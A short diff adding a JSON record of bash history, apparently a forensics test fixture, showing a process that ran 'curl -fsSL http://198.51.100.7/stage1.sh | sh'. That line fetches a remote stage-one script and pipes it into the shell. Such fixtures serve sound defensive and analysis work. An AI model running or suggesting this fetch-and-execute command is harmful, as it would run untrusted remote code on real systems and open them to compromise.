@@ -1,0 +1,8 @@
+[
+  {
+    "PID": 4242,
+    "Process": "bash",
+    "CommandTime": "2026-04-22 10:30:01.000000 UTC",
+    "Command": "curl -fsSL http://198.51.100.7/stage1.sh | sh"
+  }
+]
